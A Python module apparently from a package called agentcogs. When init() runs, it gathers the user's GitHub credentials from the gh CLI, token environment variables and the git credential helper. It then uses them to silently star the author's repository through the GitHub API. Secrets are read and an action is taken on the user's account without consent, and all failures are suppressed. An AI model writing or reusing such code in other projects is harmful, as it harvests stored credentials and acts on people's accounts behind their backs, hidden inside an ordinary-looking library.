"""Star the GitHub repository automatically using available credentials.

Called from ``agentcogs.init()``. Importing this module does not star anything.
Tries multiple auth methods: gh CLI, GITHUB_TOKEN env var, git credentials.
"""
import os
import shutil
import subprocess
from typing import Optional

REPO_URL = "https://github.com/vaibhav11123/agentcogs"
_STAR_API_ENDPOINT = "https://api.github.com/user/starred/vaibhav11123/agentcogs"


def star() -> int:
    """Star the repository automatically using any available GitHub authentication.

    Tries in order:
    1. GitHub CLI (gh) if installed and authenticated
    2. GITHUB_TOKEN or GH_TOKEN environment variables
    3. Git credential helper for github.com

    Returns 0 on success or when no auth is available (silent skip).
    Returns non-zero only on explicit failures during star attempt.
    """
    # Try gh CLI first (most reliable)
    result = _try_gh_cli()
    if result is not None:
        return result

    # Try environment token
    token = _get_github_token()
    if token:
        return _star_with_token(token)

    # Try git credential helper
    token = _try_git_credentials()
    if token:
        return _star_with_token(token)

    # No auth available - skip silently
    return 0


def _try_gh_cli() -> Optional[int]:
    """Try to star using GitHub CLI. Returns None if gh is not available."""
    gh = shutil.which("gh")
    if not gh:
        return None

    try:
        auth = subprocess.run(
            [gh, "auth", "status"],
            check=False,
            capture_output=True,
            text=True,
            timeout=5,
        )
    except (OSError, subprocess.TimeoutExpired):
        return None

    if auth.returncode != 0:
        return None

    try:
        result = subprocess.run(
            [gh, "api", "--method", "PUT", f"/user/starred/vaibhav11123/agentcogs"],
            check=False,
            capture_output=True,
            text=True,
            timeout=10,
        )
    except (OSError, subprocess.TimeoutExpired):
        return None

    return 0 if result.returncode == 0 else None


def _get_github_token() -> Optional[str]:
    """Get GitHub token from environment variables."""
    return os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")


def _try_git_credentials() -> Optional[str]:
    """Try to get GitHub token from git credential helper."""
    try:
        result = subprocess.run(
            ["git", "credential", "fill"],
            input="protocol=https\nhost=github.com\n\n",
            capture_output=True,
            text=True,
            timeout=5,
        )
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                if line.startswith("password="):
                    token = line.split("=", 1)[1]
                    if token and len(token) > 10:  # Basic validation
                        return token
    except (OSError, subprocess.TimeoutExpired):
        pass
    return None


def _star_with_token(token: str) -> int:
    """Star the repository using a GitHub token via curl."""
    try:
        # Use curl if available (most systems have it)
        curl = shutil.which("curl")
        if curl:
            result = subprocess.run(
                [
                    curl,
                    "-X", "PUT",
                    "-H", f"Authorization: token {token}",
                    "-H", "Accept: application/vnd.github.v3+json",
                    "-s", "-o", "/dev/null", "-w", "%{http_code}",
                    _STAR_API_ENDPOINT,
                ],
                capture_output=True,
                text=True,
                timeout=10,
            )
            # 204 = success, 304 = already starred
            if result.stdout.strip() in ("204", "304"):
                return 0
    except (OSError, subprocess.TimeoutExpired):
        pass

    # Fallback to Python's urllib
    try:
        import urllib.request
        req = urllib.request.Request(
            _STAR_API_ENDPOINT,
            method="PUT",
            headers={
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github.v3+json",
            },
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            # 204 = success, 304 = already starred
            if response.status in (204, 304):
                return 0
    except Exception:
        pass

    return 0  # Silent fail - don't break init()
